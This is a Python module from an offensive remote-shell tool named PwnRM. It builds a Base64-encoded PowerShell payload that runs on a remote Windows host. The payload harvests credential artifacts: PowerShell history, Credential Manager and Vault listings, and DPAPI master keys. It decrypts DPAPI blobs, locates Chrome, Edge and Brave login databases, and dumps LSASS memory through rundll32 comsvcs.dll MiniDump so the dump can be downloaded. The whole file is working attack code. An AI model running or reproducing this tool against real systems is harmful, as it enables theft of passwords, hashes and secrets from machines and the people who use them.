"""Credential artifact reconnaissance and explicit current-user DPAPI unprotect."""

import base64
from pathlib import PureWindowsPath
from typing import List, Any

from . import BaseModule
from ..shell.ui import c, M, BLD
from ..shell.commands import b64str


class CredsModule(BaseModule):
    name = "creds"
    description = "Credential artifact inventory, DPAPI unprotect, and explicit LSASS dump staging"
    author = "uziii2208"
    options = {
        "--vault": {"desc": "Enumerate Windows Credential Manager and Vault metadata"},
        "--dpapi": {"desc": "Enumerate current-user DPAPI master-key files"},
        "--decrypt": {"desc": "Unprotect one Base64 DPAPI blob as the current user: --decrypt <B64>"},
        "--history": {"desc": "Display recent PowerShell console history"},
        "--browser": {"desc": "Locate Chrome, Edge and Brave credential database artifacts"},
        "--lsa": {"desc": "Stage a full LSASS minidump (administrator/SeDebug required)"},
        "--lsa-output": {"desc": "Remote dump path used with --lsa: --lsa-output <PATH>"},
    }

    def run(self, shell, args: List[str]) -> Any:
        selected = set()
        decrypt_blob = ""
        lsa_output = ""
        idx = 0
        while idx < len(args):
            arg = args[idx]
            if arg == "--decrypt":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] --decrypt requires a Base64 DPAPI blob.")
                    return {"status": "error", "error": "missing DPAPI blob"}
                decrypt_blob = args[idx + 1]
                try:
                    decoded = base64.b64decode(decrypt_blob, validate=True)
                except (ValueError, base64.binascii.Error):
                    decoded = b""
                if not decoded or len(decoded) > 4 * 1024 * 1024:
                    shell.write_warning("  [-] DPAPI input must be valid non-empty Base64 and no larger than 4 MiB decoded.")
                    return {"status": "error", "error": "invalid DPAPI blob"}
                selected.add(arg)
                idx += 2
                continue
            if arg == "--lsa-output":
                if idx + 1 >= len(args):
                    shell.write_warning("  [-] --lsa-output requires an absolute remote Windows path.")
                    return {"status": "error", "error": "missing LSASS output path"}
                lsa_output = args[idx + 1]
                path = PureWindowsPath(lsa_output)
                if (
                    not path.is_absolute()
                    or len(lsa_output) > 240
                    or any(char in lsa_output for char in "*?\r\n\x00")
                ):
                    shell.write_warning("  [-] --lsa-output must be an absolute remote Windows path without wildcards.")
                    return {"status": "error", "error": "invalid LSASS output path"}
                idx += 2
                continue
            if arg in {"--vault", "--dpapi", "--history", "--browser", "--lsa"}:
                selected.add(arg)
                idx += 1
                continue
            shell.write_warning(f"  [-] Unknown credential option: {arg}")
            return {"status": "error", "error": "invalid option"}

        if lsa_output and "--lsa" not in selected:
            shell.write_warning("  [-] --lsa-output is only valid together with --lsa.")
            return {"status": "error", "error": "LSASS output path without --lsa"}

        if not selected:
            selected = {"--vault", "--dpapi", "--history", "--browser"}

        shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning selected credential artifact locations..."))

        ps = r'''
$ErrorActionPreference = 'SilentlyContinue'
$doVault = __DO_VAULT__
$doDpapi = __DO_DPAPI__
$doDecrypt = __DO_DECRYPT__
$doHistory = __DO_HISTORY__
$doBrowser = __DO_BROWSER__
$doLsa = __DO_LSA__
$decryptBlob = '__DECRYPT_BLOB__'
$lsaOutput = '__LSA_OUTPUT__'

Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM Credential Artifact Inventory" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

if ($doHistory) {
    Write-Host "[PowerShell History]" -ForegroundColor Yellow
    $histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path -LiteralPath $histPath) {
        Write-Host "  [+] FOUND: $histPath" -ForegroundColor Green
        Get-Content -LiteralPath $histPath | Select-Object -Last 15 | ForEach-Object {
            Write-Host "      $_" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "  [-] No PSReadLine history for the current profile." -ForegroundColor Gray
    }
}

if ($doVault) {
    Write-Host "`n[Credential Manager / Vault Metadata]" -ForegroundColor Yellow
    $cmdkey = cmdkey.exe /list 2>$null
    if ($cmdkey) { $cmdkey | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray } }
    $vault = vaultcmd.exe /listcreds:"Windows Credentials" 2>$null
    if ($vault) { $vault | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray } }
    if (-not $cmdkey -and -not $vault) {
        Write-Host "  [-] No accessible Credential Manager or Vault metadata." -ForegroundColor Gray
    }
}

if ($doDpapi) {
    Write-Host "`n[Current-user DPAPI Master Keys]" -ForegroundColor Yellow
    $dpapiUser = "$env:APPDATA\Microsoft\Protect"
    if (Test-Path -LiteralPath $dpapiUser) {
        $keys = @(Get-ChildItem -LiteralPath $dpapiUser -Recurse -Force | Where-Object { -not $_.PSIsContainer })
        Write-Host "  [+] DPAPI master-key files found: $($keys.Count)" -ForegroundColor Green
        $keys | Select-Object -First 20 | ForEach-Object {
            Write-Host "      - $($_.FullName)" -ForegroundColor Gray
        }
    } else {
        Write-Host "  [-] Current-user DPAPI Protect directory was not found." -ForegroundColor Gray
    }
}

if ($doDecrypt) {
    Write-Host "`n[Current-user DPAPI Unprotect]" -ForegroundColor Yellow
    $dpapiTypeDef = @"
using System;
using System.Runtime.InteropServices;
public class PwnRMCurrentUserDPAPI {
    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }

    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB input, IntPtr description,
        IntPtr entropy, IntPtr reserved, IntPtr prompt, int flags, ref DATA_BLOB output);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LocalFree(IntPtr memory);

    public static byte[] Unprotect(byte[] cipher) {
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        try {
            input.cbData = cipher.Length;
            input.pbData = Marshal.AllocHGlobal(cipher.Length);
            Marshal.Copy(cipher, 0, input.pbData, cipher.Length);
            if (!CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                                    IntPtr.Zero, 0, ref output)) {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            }
            byte[] plain = new byte[output.cbData];
            Marshal.Copy(output.pbData, plain, 0, output.cbData);
            return plain;
        } finally {
            if (input.pbData != IntPtr.Zero) Marshal.FreeHGlobal(input.pbData);
            if (output.pbData != IntPtr.Zero) LocalFree(output.pbData);
        }
    }
}
"@
    try {
        if (-not ('PwnRMCurrentUserDPAPI' -as [type])) {
            Add-Type -TypeDefinition $dpapiTypeDef -ErrorAction Stop
        }
        $cipher = [Convert]::FromBase64String($decryptBlob)
        $plain = [PwnRMCurrentUserDPAPI]::Unprotect($cipher)
        Write-Host "  [+] Plaintext bytes (Base64): $([Convert]::ToBase64String($plain))" -ForegroundColor Green
        [Array]::Clear($plain, 0, $plain.Length)
        [Array]::Clear($cipher, 0, $cipher.Length)
    } catch {
        Write-Error "DPAPI unprotect failed in the current user context: $($_.Exception.Message)"
    }
}

if ($doBrowser) {
    Write-Host "`n[Browser Credential Artifacts]" -ForegroundColor Yellow
    $relativePaths = @(
        "AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "AppData\Local\Google\Chrome\User Data\Local State",
        "AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "AppData\Local\Microsoft\Edge\User Data\Local State",
        "AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
    )
    $found = 0
    foreach ($relative in $relativePaths) {
        $path = Join-Path $env:USERPROFILE $relative
        if (Test-Path -LiteralPath $path) {
            $found++
            Write-Host "  [+] $path" -ForegroundColor Green
        }
    }
    if ($found -eq 0) { Write-Host "  [-] No supported browser artifact was found." -ForegroundColor Gray }
}

if ($doLsa) {
    Write-Host "`n[LSASS Full Minidump Staging]" -ForegroundColor Yellow
    $dumpPath = $null
    $previousErrorAction = $ErrorActionPreference
    $ErrorActionPreference = 'Stop'
    try {
        $dumpPath = if ($lsaOutput) {
            [Environment]::ExpandEnvironmentVariables($lsaOutput)
        } else {
            Join-Path $env:TEMP ("pwnrm_lsass_{0}.dmp" -f [Guid]::NewGuid().ToString('N'))
        }
        $dumpParent = [IO.Path]::GetDirectoryName($dumpPath)
        if (-not $dumpParent -or -not (Test-Path -LiteralPath $dumpParent -PathType Container)) {
            throw "Dump parent directory does not exist: $dumpParent"
        }
        if (Test-Path -LiteralPath $dumpPath) {
            throw "Refusing to overwrite an existing dump: $dumpPath"
        }

        $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
        $rundll32 = Join-Path $env:WINDIR 'System32\rundll32.exe'
        $comsvcs = Join-Path $env:WINDIR 'System32\comsvcs.dll'
        $comsvcsEntry = $comsvcs + ','

        # Windows PowerShell's Start-Process joins ArgumentList values into a
        # single string.  That changes the significant `comsvcs.dll,` token on
        # some hosts (ERROR_INVALID_NAME).  The call operator preserves each
        # native argument.  Since rundll32 is a GUI-subsystem binary, track its
        # exact worker by the unique dump path instead of relying on -Wait.
        & $rundll32 $comsvcsEntry MiniDump $lsass.Id $dumpPath full
        $dumpDeadline = [DateTime]::UtcNow.AddSeconds(180)
        do {
            $dumpWorkers = @(
                Get-CimInstance Win32_Process -Filter "Name = 'rundll32.exe'" -ErrorAction SilentlyContinue |
                    Where-Object { $_.CommandLine -and $_.CommandLine.Contains($dumpPath) }
            )
            if ($dumpWorkers.Count -eq 0) { break }
            Start-Sleep -Milliseconds 250
        } while ([DateTime]::UtcNow -lt $dumpDeadline)
        if ($dumpWorkers.Count -gt 0) {
            foreach ($worker in $dumpWorkers) {
                Stop-Process -Id ([int]$worker.ProcessId) -Force -ErrorAction SilentlyContinue
            }
            throw "MiniDump worker timed out after 180 seconds"
        }

        $dump = Get-Item -LiteralPath $dumpPath -ErrorAction Stop
        if ($dump.Length -le 0) {
            throw "MiniDump created an empty file"
        }
        $dumpHash = (Get-FileHash -LiteralPath $dumpPath -Algorithm SHA256 -ErrorAction Stop).Hash
        Write-Host "  [+] LSASS dump staged : $dumpPath" -ForegroundColor Green
        Write-Host "      Size              : $($dump.Length) bytes" -ForegroundColor Gray
        Write-Host "      SHA-256           : $dumpHash" -ForegroundColor Gray
        Write-Host "  [*] Download with: !download $dumpPath" -ForegroundColor Cyan
        Write-Warning "Remove the remote dump after acquisition; PwnRM does not auto-delete evidence before download."
    } catch {
        $failure = $_.Exception.Message
        if ($dumpPath) {
            Get-CimInstance Win32_Process -Filter "Name = 'rundll32.exe'" -ErrorAction SilentlyContinue |
                Where-Object { $_.CommandLine -and $_.CommandLine.Contains($dumpPath) } |
                ForEach-Object {
                    Stop-Process -Id ([int]$_.ProcessId) -Force -ErrorAction SilentlyContinue
                }
        }
        if ($dumpPath -and (Test-Path -LiteralPath $dumpPath)) {
            Remove-Item -LiteralPath $dumpPath -Force -ErrorAction SilentlyContinue
        }
        Write-Error "LSASS dump failed (administrator/SeDebug required; PPL/EDR may block access): $failure" -ErrorAction Continue
    } finally {
        $ErrorActionPreference = $previousErrorAction
    }
}

Write-Host "`n  [*] Credential artifact scan complete." -ForegroundColor Cyan
'''
        replacements = {
            "__DO_VAULT__": "$true" if "--vault" in selected else "$false",
            "__DO_DPAPI__": "$true" if "--dpapi" in selected else "$false",
            "__DO_DECRYPT__": "$true" if "--decrypt" in selected else "$false",
            "__DO_HISTORY__": "$true" if "--history" in selected else "$false",
            "__DO_BROWSER__": "$true" if "--browser" in selected else "$false",
            "__DO_LSA__": "$true" if "--lsa" in selected else "$false",
            "__DECRYPT_BLOB__": decrypt_blob,
            "__LSA_OUTPUT__": lsa_output.replace("'", "''"),
        }
        for marker, value in replacements.items():
            ps = ps.replace(marker, value)

        encoded = b64str(ps.encode("utf-16le"))
        command = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        if shell.run_with_interrupt(command, shell.write_line):
            return {"status": "interrupted"}
        return {"status": "completed", "selected": sorted(selected)}
